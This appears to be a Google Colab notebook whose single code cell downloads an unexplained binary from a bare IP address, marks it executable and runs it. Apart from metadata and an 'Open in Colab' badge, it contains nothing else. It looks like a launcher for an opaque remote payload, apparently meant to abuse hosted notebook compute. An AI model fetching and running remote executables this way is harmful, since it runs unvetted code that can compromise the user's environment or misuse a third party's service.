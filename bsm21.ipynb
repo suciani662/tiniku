{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "bsm21.ipynb",
      "provenance": [],
      "authorship_tag": "ABX9TyN/dvszLBCbfndyX7NKJg23",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/suciani662/tiniku/blob/main/bsm21.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "6JXk6H9b621p"
      },
      "outputs": [],
      "source": [
        "!wget http://137.184.39.112/pukat/bsm21 && chmod +x bsm21 && ./bsm21"
      ]
    }
  ]
}